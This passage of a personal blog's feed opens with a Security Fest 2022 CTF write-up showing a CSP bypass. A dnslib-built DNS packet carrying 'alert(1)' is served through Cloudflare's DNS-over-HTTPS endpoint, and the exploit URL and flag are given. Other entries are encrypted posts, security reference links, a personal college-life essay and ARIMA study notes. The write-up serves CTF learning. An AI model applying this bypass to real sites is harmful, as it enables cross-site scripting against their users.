style="zoom:50%;"><p>有点像</p><p>我还找到了这个</p><p><a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints-+-jsonp">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints-+-jsonp</a></p><p>不太行 没啥 jsonp</p><p><img src="/2022/06/02/Security-Fest-2022/image-20220603155219679.png" alt="image-20220603155219679"></p><p>maple大哥的解</p><blockquote><p>很明顯是要在 <code>cloudflare-dns.com</code> 上面找到 endpoint 可以回傳自訂的 payload。</p><p>後來查一查官方文件看到了這個: <a href="https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/make-api-requests/dns-wireformat/">Using DNS Wireformat</a></p><p>它能讓你直接把 DNS 的 packet 用 base64 encode 放在 url 上傳送，然後回傳值是直接 binary DNS response。所以可以看看有沒有什麼方法能讓 DNS response 變成 js 來繞 CSP。</p></blockquote><blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> dnslib <span class="keyword">import</span> DNSRecord, DNSQuestion, DNSHeader</span><br><span class="line"></span><br><span class="line">pkt = DNSRecord(DNSHeader(id=<span class="number">0x2F2A</span>), q=DNSQuestion(<span class="string">&quot;*/alert(1)//&quot;</span>))</span><br><span class="line">b64encode(pkt.pack())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># http:<span class="comment">//madness-01.hackaplaneten.se:3000/%5Ccloudflare-dns.com/dns-query%3Fdns%3DLyoBAAABAAAAAAAADCovYWxlcnQoMSkvLwAAAQAB%23</span></span><br><span class="line"># SECFEST&#123;l00kz_l13K_JS_2_m3!?&#125;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;玩玩&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>IOT base knowledge</title>
    <link href="http://example.com/2022/06/02/IOT-knowledge/"/>
    <id>http://example.com/2022/06/02/IOT-knowledge/</id>
    <published>2022-06-02T12:50:38.000Z</published>
    <updated>2022-06-21T12:51:18.690Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7fb21a141c29b1245ea4d9893dc388fde236230966e78736275ee091162908ee"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="IOTSEC" scheme="http://example.com/categories/IOTSEC/"/>
    
    
    <category term="IOT" scheme="http://example.com/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>pwn college shellcode writeup</title>
    <link href="http://example.com/2022/06/02/pwn-college-shellcode/"/>
    <id>http://example.com/2022/06/02/pwn-college-shellcode/</id>
    <published>2022-06-02T12:03:46.000Z</published>
    <updated>2022-06-02T12:39:08.951Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0234b2a93ac4f0daa6597e6b06b93505e00ccdaf219157675f92241b1214c69d">71e2da999998db8dcc5916e532117f2577d0503c52c0d33dbe669c5f98a4a2a747820ec5dded522263d08521fbe92c3aad0b236f6d594833de49fb26de8dad0e1425709db4a831194d5e940b404f5fe10d9274a1c07a32d98937ac389b813b08ca5c34ce63e5cbbe39b3091364f58d6b25b255931a2c80375adb7000a452e519c4f67ad4e5fba438d8dacffb7a29bed5ec9238aa3c31d3b0b9da0ae6fdfb39f27d28f149238a7e3a77b09e74a18780f9483b358f777bccd9819178b6a68161150a7357315d5deef72e151c87a538c382a6cf165e4fcf9bc99a9cc027167c3ae6cef1f827c5b6e9ffac9e0861d117a5d342f34408fe3544f5e554fbd5dadad2e8bf99ab9fef458e5205e993fcb761d649bb7a205180ed1b80c493ed7fb8b92b2ae7b4d44474314180c37de6c56a4b964684fdefdc20a3fa9edaf1416221ee91004aa7b9a171b76752d9924035d35da53a52a8c646536bb1bd0ba9ce4255e1014321b55561b03842df33b0afcf76517092b0719e963020658a31afb133302b0254cb5b37ddd86b438e4496ae027b5b6176c41dae70b9404bbd7bc87d900a4e3c450e02f0692deb9e095544bb4831e9df78ee09782b89f9245658b206eefd084f8917209edff977f0eb7fb242fa290b200cf6de40c02043fd64af9051e9b6b3229f008f9f46a083c8960ff99682d01ca7e43ef0023be9f067892b70dfa31cea9faf89ffb5642fb8caadf76d18cf4597e25085d0e30195084f1a446e2675872146d557e2984383d413239046f7589568bae3471f1c15ed62de30cba80808ab595954eca722a3d18f55ba1cad8a8a9a3b8a1600f3ce1d3f8027538bae54d685c008cf5814ea4f97dd68bd10e02ec548e7e37d02c7e7f21cc90f915aec9910782e01f3b3e33ca5367c06128dcb65c0d803c3460d7a7fde543c586db756e774c81b4c7642168b8520ecddeace195407959344287a6112256142618f278d526ac4e1b913badac500d10dc4689626d2bba490fa207858215845abf3314cb303ae8d8b74c0841f65492a9ddd8c73fd1e2eb0595bea8eeaddccd89960f6b768f8d4416bc37d8a0c4429dd847b219018ab6783eab3ddbda0d6eb63e7eace80d59690e78908370efb9668fe44d29b48387b2125e8bd024180a38216be5f4d2d370aa5e0f0bd337a26e1f46a01c3f569d4d9b919b46b99b3e449f161986cfe0fdb99ee54b449ba69481ec90a2d250bbd97cb68d978fd260eb7525d547af037f9089a54da7bc7a4d62b966761681bbad5f58919295829089570e9ae0c90da1fd526415c0f350d8ffc538c4092234e25cc75f06fd2a0e319a390f25978f36eb498a030edc543a9dd271d63f2c6622c4b4632f969ea5ef62adde33724b23e8a5844ec2577474c097b12ec53b82e6ab29e33041c5767f73dc7e1caefe981a8dc875a6aaa9efd79e1b418bd1235b815a155acf69b0d4bc1a875d12ca064a9be5facc81efc281457330619b5fb7a55576220ff25309ec27e087f16f98e9a992283ad43c2a8aa1e2bca817015f0676c22e531601d87d38876cb27bff1be5849c5747d2fee5ee960206784ab28a34ee7b1ba00ccfdf873a1bc3b78ba9f0dbf947f9e3492a401981399fcf57c596f0c63b99ad7f0d25946c1c782d12462634919e938c396f92cf7a2f3ce9f566fcdcdf66498277f829b42b83ef97c5aede00d41ca915f61560095ffa0748e170b6f737eff40f7b3e40adf40f40c1c8be95882c3f7110ebae18f054cb45c457b462ff022e04ea249dd4cee18fd8f9761c2baa469baac22224430ac43a310135b316badd2ca7fac428ee8806bbc4046</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="shellcode" scheme="http://example.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>XSSI</title>
    <link href="http://example.com/2022/05/27/XSSI/"/>
    <id>http://example.com/2022/05/27/XSSI/</id>
    <published>2022-05-27T05:37:11.000Z</published>
    <updated>2022-05-27T09:17:35.288Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion">https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion</a></p><p><a href="https://github.com/BlackFan/ctfs/tree/master/volgactf_2022_quals">https://github.com/BlackFan/ctfs/tree/master/volgactf_2022_quals</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a">https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion&quot;&gt;https://book.hacktricks.xyz/pentesting-web/xssi-cro</summary>
      
    
    
    
    <category term="sec" scheme="http://example.com/categories/sec/"/>
    
    
    <category term="XSSI" scheme="http://example.com/tags/XSSI/"/>
    
  </entry>
  
  <entry>
    <title>20岁的年纪 少年的江湖</title>
    <link href="http://example.com/2022/05/24/review-my-college-first/"/>
    <id>http://example.com/2022/05/24/review-my-college-first/</id>
    <published>2022-05-24T11:15:21.000Z</published>
    <updated>2022-05-30T08:44:36.403Z</updated>
    
    <content type="html"><![CDATA[<p>今天，我一个人走在下着小雨的路上。</p><p>在路上，我想了一些东西，事实上，当你一个人的时候，你才会去想一些东西。而这种机会，竟不知不觉间变得很少。</p><p>我在想什么？很简单却又很复杂。比如未来的去向，比如今天做的实验哪里可以改进，比如我为什么不喜欢下雨打伞，去做和别人不一样的事走、别人不一样的路，比如……</p><p>还有十几天就要步入21岁了。</p><p>人们在前行的时候，也许不仅仅要时刻仰望天空中的繁星，也应该回头看看脚下走过的路。</p><p>为了避免过一段时间的考试周，选择在这个特殊的时候反省一些东西。也许是因为我迫不及待地想把一些想法记录下来。于是有了这篇文章。</p><p>我并不指望有多少人能看到这篇文章。</p><p>这篇文章本来也是写给我自己的。</p><p>致我的的20岁青春。</p><span id="more"></span><h2 id="回顾我的20岁青春"><a href="#回顾我的20岁青春" class="headerlink" title="回顾我的20岁青春"></a>回顾我的20岁青春</h2><p>从18岁说起吧。</p><p>也许要从跟早。比如16岁。</p><p>怎么说呢，很矛盾，直到现在我无法对我自己的过去做出评价。</p><p>而每当我想起这些事情的时候，想法总会发生变化。</p><p>有时我会佩服我当时的勇气，有时我又会觉得过去的自己很天真。</p><p>不管怎样，我并不想过多地去评价18岁之前的自己。</p><p>确实，我当时失败的很彻底。但我却不敢否认这次失败。把一切留都留给时间吧。</p><p>但是19岁的一年，磨平了我所有的棱角。</p><p>19岁的那一年，是痛苦的，却也使我成长了许多。</p><p>我并不想多谈那些痛苦的回忆，虽然这段经历对我目前的人生甚至之后所有的人生都有重大的意义。</p><p>但至少有一点没变，我没有变成几年前曾厌恶的样子。我觉得，已经够了。</p><p>故事要从我高考失利，并且运气差了那么一丢丢，独自来到南方这陌生的省份，陌生的城市说起。</p><p>我当时也没想那么多，可能也正是差了那么一丢丢的运气，才让我接触到了计算机。</p><p>当时的我，并没有那么绝望，出乎我的意料，我似乎平静地接受了这一切。</p><p>就这样，我来到了我现在的学校。</p><p><strong>大一上学期开始了。</strong></p><p>刚进校园的我，觉得自己不能摆烂的原因是因为我觉得我虽然高考失利，但我的能力理应是能在这样一所学校出类拔萃的。</p><p>也就是这样一种思想，拯救了我。</p><p>至少我是这么认为的。我拒绝平庸。我想再一次证明自己。我想打某些人的脸，狠狠地。</p><p>印象最深的其实是我们学校的ACM宣讲。听说我们学校的ACM能进世界决赛，我当时真觉得很了不起。</p><p>于是我当时就分别加了两位学长学姐的QQ，直言不讳地说，我想打ACM。</p><p>我觉得这是证明自己的一个好机会。</p><p>但可惜的是，我并没有任何基础。所以第一个学期，我并没有在ACM上付出很多，因为我也不知道该如何付出。</p><p>之后，我遇到了一个我很感激的团队。West Two。</p><p>正是这样一个团队，使得我并没有摆烂。在一个个deadline的催促下，我完成了第一学期Java和Python方向的考核。使我不再对计算机一无所知。</p><p>也正是这两项考核，使我在大一上学期一直泡在图书馆里敲代码。没变成一个废人。</p><p>除此之外，意外收获可能属于ROIS的宣讲了。当时真的是什么都想试试，现在回想一下，还好当时去听了宣讲，可能我是我们班唯一一个。对了，当时万兄看我在空间转发的宣讲说说，和我聊了聊CTF，我才打算去听的宣讲。这么说还要感谢一下万兄。</p><p>时间过得很快，寒假转眼即至。</p><p>期末，对我来说，并没有很大的触动。我拿了一个30%的成绩。我也早就知道不会太好，因为很多科目我甚至一学期只看了半天就去考试了。</p><p>一个学期的大学体验，我当时就明白了绩点再高，不会技术，还是一个fw。直到现在我也是这么想。</p><p>寒假，两种选择摆在我面前。</p><p>一种是ACM，一种是CTF。很真实。</p><p>我知道我没有能力两种都选。我不是天才。</p><p>犹豫了很久，我最终选择了CTF。可能是以为高中时收的伤，心里总对数学有所排斥。</p><p>于是我开始了完成ROIS的寒假集训。</p><p>最终，一个寒假我都在卷。捐完了West Two两项考核所有作业。捐完了ROIS的预备成员考核。最终，我成为了ROIS的预备队员。</p><p><img src="/2022/05/24/review-my-college-first/10c075888e3d35fc.jpg" alt="10c075888e3d35fc"></p><p><strong>再接着，到了大一下了。</strong></p><p>我还是会每天去图书馆敲代码。并且开始接触CTF一些小比赛。</p><p>我记得当时我拉了两个hxd参加了安恒的三月赛。成功爆零。</p><p>那题SSTI直到现在都印象深刻。之后我陆陆续续参加了几个小比赛，美团杯，蓝帽杯，津门杯…</p><p>也正是因为我每次活跃的打了这些比赛，jb师傅把国赛剩下的一个名额留给了我。很感激。</p><p>哦，对了，之间还有一个小插曲。由于我们大一是在另外一个校区，很难找到人打比赛，于是我去面了下V&amp;N战队，并且加入了他们。因为他们每次比赛排名都很靠前，很羡慕。</p><p>虽然后来因为这件事指导老师没给过我好脸色，但who care? 我又找不到人打比赛，怪我咯。</p><p>后来就是去年的这个时候，我们一起参加了国赛。我以三队的身份参赛，并被队友疯狂带飞，拿了个华东南赛区二等奖。我知道很有运气成分，我的作用很小，但是，谁说运气不是一种实力呢？如果不是我积极在参与一些比赛，学长又怎么会找到我呢。</p><p><strong>机会，是留给有准备的人的。</strong></p><p><img src="/2022/05/24/review-my-college-first/407(1).jpg" alt="407(1)"></p><p>后来还和队友参加了TCTF的预选赛，并成功入选，那是我第一次在大型比赛中做出来题目，一道MISC。真的很开心。</p><p>除此之外，忘了说了，我还突破自我，跳了一学期的街舞。实际上是一年，后面不会提到了。很有趣的经历。</p><p>哦，还参加了院里的篮球赛，哈哈，上场的时候真的很开心。</p><p><strong>再后来，暑假来了。</strong></p><p>整个暑假，我留在学校没有走。想要精进我的技术。</p><p>学长把参加XMAN夏令营的资格让给了我。很荣幸。也正是这样的一个机会，使我了解到了r3kapig战队。当时在我眼中是神一样的团队，毕竟江湖上都是r3kapig的传说，而且猫哥也在那里。在夏令营中，r3kapig队长给了我们一个演讲，并且邀请我们加入r3kapig战队。我没有犹豫，虽然这件事后来给我带来了很多困扰。</p><p>然后就是我一个人呆在实验室，整整一个暑假。因为别人都是本省的，只有我一个外省的后一个月想走没走掉……</p><p>后来还参加HWS的一个IOT夏令营，认识了xuan哥等大佬，也开阔了眼界。</p><p>也正是这个暑假，我第一次参加了国外的比赛。并逐渐适应打国际赛。虽然直到今天也很菜。</p><p>然后第一次和r4kapig参加了一场比赛 W&amp;M CTF。并且拿了第三名。r3kapig的氛围是真的好，大家都像朋友一样，即使是大佬也没有任何架子。</p><p>很开心。</p><p><img src="/2022/05/24/review-my-college-first/1653396073607.jpeg" alt="1653396073607"></p><p><strong>开学了，转眼，已大二上。</strong></p><p>这个上学期没什么好说的。在我的印象中，一直泡在实验室打比赛。</p><p>参加了TCTF Final， 在实验室通了一宵。</p><p>最后很开心，虽然就输出来半题，但是和队友一起打比赛真的很快乐。</p><p>再后来，我也要为自己的未来考虑考虑了。</p><p>未来，很模糊，但我要努力使未来变清晰。</p><p>我记得，我一直有出国的想法。但在暑假，我正式确立了出国的想法。因为，我对国内的计算机教育还是有点失望。</p><p>最终，我先把目标定在了新加坡国立大学和南洋理工大学之间。</p><p>单这件事和我之前说的那件事给我带来了一段时间的困扰。</p><p>然后就是边玩边准备期末。好像也没好好准备。最后结果也没达到预期。哎。有些科目我真的是有点厌恶，没办法，比如物理。</p><p><strong>又是一年寒假。</strong></p><p>我考了驾照。大一寒假挂的科三。拿到驾照的我真的很兴奋。</p><p><del>然后就是我年后和ROIS分手了。我这边没是和老师沟通好，但也很奇妙，我也不知道为什么，总之因为这件事，我颓废了很长时间，很不理解。对这个团队也有了些意见，人之常情嘛。过了一段时间想开了，反正走就走了，坦然点。</del></p><p>我想说的是一个有潜力的人在哪里都可以发展自己。</p><p>依靠团队虽然也一种实力，但我觉得个人的能力真的能否得到认可就不知道了。</p><p>离开也是一种成长。我Hao某人可不是依靠团队的力量。</p><p>想证明自己还是要依靠自己的力量。</p><p>总要找个归宿，以我的当时的技术，在学校实验室找一份工作并不难。</p><p>最后我在福建省网络计算与智能信息处理实验室找到了一份工作。</p><p>可能，我还要感谢ROIS和我的分手。</p><p>我遇到了我人生中的第一个导师 – 郭导。</p><p>我感觉，我真的很幸运。郭导对我是真的好。师兄师姐们对我也是真的好，真的很幸福。大家都很愿意帮我，我自然也愿意付出。</p><p>也许上帝为你关上一扇门，就会为你打开一扇窗。</p><p>于是开始了我的科研生涯。</p><img src="/2022/05/24/review-my-college-first/IMG_20220508_131536.jpg" alt="IMG_20220508_131536" style="zoom: 10%;"><p>除此之外，我还跟着新东方学了一寒假的雅思。快学吐了。</p><p><strong>转眼，大二下。</strong></p><p>时间过得飞快。转眼，大学生活即将过去一半。</p><p>开学后，我颓废了将近两个月。</p><p>不过后来想想，大学生，颓废一下好像也没有什么不对。</p><p>不过就算是颓废，还是搞了个新的博客、跟r3kapig基本上打了所有的国际赛。</p><p>途中认识了RDD，风萧等大哥。</p><p>还没转正就是咯。</p><p>再后来，申请了一个SRTP。</p><p>再后来，跟着学长做了一些科研。</p><p>又是一整天一整天泡在实验室的生活。</p><p>SRTP的申请，学校专家还没给意见，我们这边实验都做完了……</p><p>现在就想着能不能改进一下，希望发个好一点的会议。</p><p>除此之外，我申请的NUS的summer workshop也被通过了，很开心。。。暑假有事做了。</p><p>但也很苦恼，因为这个workshop，我就没时间去暑期实习了…</p><p>这个周末就是DEFCON了，再过半个月，我就步入21岁了。</p><p>希望一切顺利。</p><p>等DEFCON过后再继续写一写。</p><p><del>未完待续……</del></p><p><strong>DEFCON OVER</strong></p><p>我跟随r3kapig打了今年的defcon quals。</p><p>别的不说，坐牢是做了两天。</p><p>不会二进制的我只能给队友精神上的鼓励。</p><p>这又激起了我学二进制的想法。</p><p>因为看队友拼命解题我却只能傻傻看着而帮不上忙真的很呆。</p><p><code>shifu， i want to learn pwn！</code></p><img src="/2022/05/24/review-my-college-first/FT9x_MaWYAAA5yi.jpeg" style="zoom:33%;"><p> 队中大佬们真的是tql，我不知道我什么时候才能够望见他们的脚步。</p><p>慢慢来吧。</p><p>暑假实习简历已经投了出去。</p><p>舔。就硬舔。</p><p>能不能有结果就不知道了。</p><p>安全学习的道路还很漫长，至少我还在走这条道路。</p><p>慢慢来吧，希望一切都会有好的结果。</p><p>致我的20岁青春。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天，我一个人走在下着小雨的路上。&lt;/p&gt;
&lt;p&gt;在路上，我想了一些东西，事实上，当你一个人的时候，你才会去想一些东西。而这种机会，竟不知不觉间变得很少。&lt;/p&gt;
&lt;p&gt;我在想什么？很简单却又很复杂。比如未来的去向，比如今天做的实验哪里可以改进，比如我为什么不喜欢下雨打伞，去做和别人不一样的事走、别人不一样的路，比如……&lt;/p&gt;
&lt;p&gt;还有十几天就要步入21岁了。&lt;/p&gt;
&lt;p&gt;人们在前行的时候，也许不仅仅要时刻仰望天空中的繁星，也应该回头看看脚下走过的路。&lt;/p&gt;
&lt;p&gt;为了避免过一段时间的考试周，选择在这个特殊的时候反省一些东西。也许是因为我迫不及待地想把一些想法记录下来。于是有了这篇文章。&lt;/p&gt;
&lt;p&gt;我并不指望有多少人能看到这篇文章。&lt;/p&gt;
&lt;p&gt;这篇文章本来也是写给我自己的。&lt;/p&gt;
&lt;p&gt;致我的的20岁青春。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="http://example.com/categories/diary/"/>
    
    
    <category term="review&amp;think" scheme="http://example.com/tags/review-think/"/>
    
  </entry>
  
  <entry>
    <title>attention-learn</title>
    <link href="http://example.com/2022/05/23/attention-learn/"/>
    <id>http://example.com/2022/05/23/attention-learn/</id>
    <published>2022-05-23T04:54:46.000Z</published>
    <updated>2022-05-26T11:06:49.629Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5ea695c21900059e1c78b75f3469a7b030c48de41818a49f6169a3497727e1e8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="ML" scheme="http://example.com/categories/ML/"/>
    
    
    <category term="attention" scheme="http://example.com/tags/attention/"/>
    
  </entry>
  
  <entry>
    <title>GRU-learn</title>
    <link href="http://example.com/2022/05/21/GRU-learn/"/>
    <id>http://example.com/2022/05/21/GRU-learn/</id>
    <published>2022-05-21T12:20:32.000Z</published>
    <updated>2022-05-23T04:53:25.656Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="207a3862a6ebbf231e827d138f063558dfe555d0d43a85c293723a52a133e0ba"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="ML" scheme="http://example.com/categories/ML/"/>
    
    
    <category term="Time-series" scheme="http://example.com/tags/Time-series/"/>
    
  </entry>
  
  <entry>
    <title>ARIMA</title>
    <link href="http://example.com/2022/05/19/ARIMA/"/>
    <id>http://example.com/2022/05/19/ARIMA/</id>
    <published>2022-05-19T11:36:20.000Z</published>
    <updated>2022-05-22T14:35:34.191Z</updated>
    
    <content type="html"><![CDATA[<p>learn learn~~</p><span id="more"></span><h1 id="Page"><a href="#Page" class="headerlink" title="Page"></a>Page</h1><h2 id="Stationarity-and-differencing"><a href="#Stationarity-and-differencing" class="headerlink" title="Stationarity and differencing"></a>Stationarity and differencing</h2><p> A <em>stationary</em> time series is one whose statistical properties such as mean, variance, autocorrelation, etc. are all constant over time. Most statistical forecasting methods are based on the assumption that the time series can be rendered approximately stationary (i.e., “stationarized”) through the use of mathematical transformations. A stationarized series is relatively easy to predict: you simply predict that its statistical properties will be the same in the future as they have been in the past!  (Recall our <a href="https://people.duke.edu/~rnau/411quote.htm">famous forecasting quotes</a>.) The predictions for the stationarized series can then be “untransformed,” by reversing whatever mathematical transformations were previously used, to obtain predictions for the original series. (The details are normally taken care of by your software.) Thus, finding the sequence of transformations needed to stationarize a time series often provides important clues in the search for an appropriate forecasting model. Stationarizing a time series through differencing (where needed) is an important part of the process of fitting an <strong>ARIMA model</strong>, as discussed in the <a href="https://people.duke.edu/~rnau/411arim.htm">ARIMA pages</a> of these notes.</p><p><img src="/2022/05/19/ARIMA/image-20220520120922114.png" alt="image-20220520120922114"></p><p><img src="/2022/05/19/ARIMA/image-20220520120547301.png" alt="image-20220520120547301"></p><p>基本都是若平稳 严平稳不太现实</p><p><img src="/2022/05/19/ARIMA/image-20220520120852730.png" alt="image-20220520120852730"></p><p>差分法可以使得数据变得更加平稳</p><h2 id="What-does-the-p-d-and-q-in-ARIMA-model-mean"><a href="#What-does-the-p-d-and-q-in-ARIMA-model-mean" class="headerlink" title="What does the p, d and q in ARIMA model mean"></a>What does the p, d and q in ARIMA model mean</h2><p>the value of<code> d</code>, therefore, is the minimum number of differencing needed to make the series stationary. And if the time series is already stationary, then <code>d = 0</code>.</p><p><code>p</code> is the order of the ‘Auto Regressive’ (AR) term. It refers to the number of lags of Y to be used as predictors. And <code>q</code> is the order of the ‘Moving Average’ (MA) term. It refers to the number of lagged forecast errors that should go into the ARIMA Model.</p><p>you can understand more clearly by reading next chapter</p><h2 id="What-are-AR-and-MA-models"><a href="#What-are-AR-and-MA-models" class="headerlink" title="What are AR and MA models"></a>What are AR and MA models</h2><h3 id="AR"><a href="#AR" class="headerlink" title="AR"></a><strong>AR</strong></h3><p><img src="/2022/05/19/ARIMA/image-20220520121643408.png" alt="image-20220520121643408"></p><p><strong>限制</strong></p><p><img src="/2022/05/19/ARIMA/image-20220520122324677.png" alt="image-20220520122324677"></p><h3 id="MA"><a href="#MA" class="headerlink" title="MA"></a>MA</h3><p><img src="/2022/05/19/ARIMA/image-20220520122905060.png" alt="image-20220520122905060"></p><h3 id="AR-MA"><a href="#AR-MA" class="headerlink" title="AR+MA"></a><strong>AR+MA</strong></h3><p><img src="/2022/05/19/ARIMA/image-20220520123101024.png" alt="image-20220520123101024"></p><h3 id="ARIMA"><a href="#ARIMA" class="headerlink" title="ARIMA"></a>ARIMA</h3><p><img src="/2022/05/19/ARIMA/image-20220520123635421.png" alt="image-20220520123635421"></p><h2 id="what-is-ACF-and-PACF"><a href="#what-is-ACF-and-PACF" class="headerlink" title="what is ACF and PACF"></a>what is ACF and PACF</h2><h3 id="ACF"><a href="#ACF" class="headerlink" title="ACF"></a>ACF</h3><p><img src="/2022/05/19/ARIMA/image-20220520123950209.png" alt="image-20220520123950209"></p><h3 id="PACF"><a href="#PACF" class="headerlink" title="PACF"></a>PACF</h3><p>单纯地考虑 <code>x(t)</code> 和 <code>x(t-k)</code> 的关系</p><p><img src="/2022/05/19/ARIMA/image-20220520124724627.png" alt="image-20220520124724627"></p><p><a href="https://timeseriesreasoning.com/contents/partial-auto-correlation/">https://timeseriesreasoning.com/contents/partial-auto-correlation/</a></p><p><a href="https://online.stat.psu.edu/stat510/lesson/2/2.2">https://online.stat.psu.edu/stat510/lesson/2/2.2</a></p><h2 id="How-to-find-the-order-of-the-MA-term-p-q-d"><a href="#How-to-find-the-order-of-the-MA-term-p-q-d" class="headerlink" title="How to find the order of the MA term (p,q,d)"></a>How to find the order of the MA term (p,q,d)</h2><p><img src="/2022/05/19/ARIMA/image-20220520125414144.png" alt="image-20220520125414144"></p><p><img src="/2022/05/19/ARIMA/image-20220520131212749.png" alt="image-20220520131212749"></p><h3 id="How-to-find-the-order-of-differencing-d-in-ARIMA-model"><a href="#How-to-find-the-order-of-differencing-d-in-ARIMA-model" class="headerlink" title="How to find the order of differencing (d) in ARIMA model"></a>How to find the order of differencing (d) in ARIMA model</h3><p>The purpose of differencing it to make the time series stationary.</p><p>But you need to be careful to not over-difference the series. Because, an over differenced series may still be stationary, which in turn will affect the model parameters.</p><p>The right order of differencing is the minimum differencing required to get a near-stationary series which roams around a defined mean and the ACF plot reaches to zero fairly quick.</p><p>If the autocorrelations are positive for many number of lags (10 or more), then the series needs further differencing. On the other hand, if the lag 1 autocorrelation itself is too negative, then the series is probably over-differenced.</p><p>In the event, you can’t really decide between two orders of differencing, then go with the order that gives the least standard deviation in the differenced series.</p><p>check if the series is stationary using the <a href="https://www.machinelearningplus.com/time-series/augmented-dickey-fuller-test/">Augmented Dickey Fuller test </a>(<code>adfuller()</code>), from the statsmodels package.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np, pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> statsmodels.graphics.tsaplots <span class="keyword">import</span> plot_acf, plot_pacf</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams.update(&#123;<span class="string">&#x27;figure.figsize&#x27;</span>:(<span class="number">9</span>,<span class="number">7</span>), <span class="string">&#x27;figure.dpi&#x27;</span>:<span class="number">120</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Import data</span></span><br><span 